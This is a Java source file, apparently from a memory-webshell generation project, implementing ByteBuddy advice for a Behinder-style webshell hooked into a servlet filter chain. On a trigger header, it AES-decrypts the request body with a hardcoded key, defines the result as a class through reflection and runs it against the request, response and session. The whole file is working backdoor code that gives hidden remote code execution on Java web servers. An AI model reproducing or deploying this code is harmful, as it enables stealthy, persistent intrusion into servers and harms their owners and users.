package com.reajason.javaweb.memshell.shelltool.behinder;

import net.bytebuddy.asm.Advice;

import java.io.BufferedReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 */
public class BehinderFilterChainAdvisor {

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 0) Object request,
            @Advice.Argument(value = 1) Object res
    ) {
        String pass = "pass";
        String headerName = "headerName";
        String headerValue = "headerValue";
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null
                    && value.contains(headerValue)) {
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", request);
                Object response = res;
                Field field = null;
                Class<?> clazz = obj.getClass();
                while (clazz != Object.class) {
                    try {
                        field = clazz.getDeclaredField("response");
                        break;
                    } catch (NoSuchFieldException var5) {
                        clazz = clazz.getSuperclass();
                    }
                }
                if (field != null) {
                    field.setAccessible(true);
                    response = field.get(response);
                }
                obj.put("response", response);
                Object session = request.getClass().getMethod("getSession").invoke(request);
                session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "u", pass);
                obj.put("session", session);
                byte[] data = null;
                Class<?> base64;
                BufferedReader reader = (BufferedReader) request.getClass().getMethod("getReader").invoke(request);
                String parameter = reader.readLine();
                try {
                    base64 = Class.forName("java.util.Base64", true, Thread.currentThread().getContextClassLoader());
                    Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                    data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
                } catch (Exception var6) {
                    base64 = Class.forName("sun.misc.BASE64Decoder", true, Thread.currentThread().getContextClassLoader());
                    Object decoder = base64.newInstance();
                    data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
                }
                Class<?> cipherClass = Class.forName("javax.crypto.Cipher", true, Thread.currentThread().getContextClassLoader());
                Class<?> secretKeySpecClass = Class.forName("javax.crypto.spec.SecretKeySpec", true, Thread.currentThread().getContextClassLoader());
                Class<?> keyClass = Class.forName("java.security.Key", true, Thread.currentThread().getContextClassLoader());
                Object cipher = cipherClass.getMethod("getInstance", String.class).invoke(cipherClass, "AES");
                Object secretKeySpec = secretKeySpecClass.getConstructor(byte[].class, String.class).newInstance(pass.getBytes(), "AES");
                Method cipherInitMethod = cipherClass.getMethod("init", int.class, keyClass);
                Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
                cipherInitMethod.invoke(cipher, 2, secretKeySpec);
                byte[] bytes = (byte[]) doFinalMethod.invoke(cipher, data);
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);
                Object instance = payload.newInstance();
                instance.equals(obj);
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}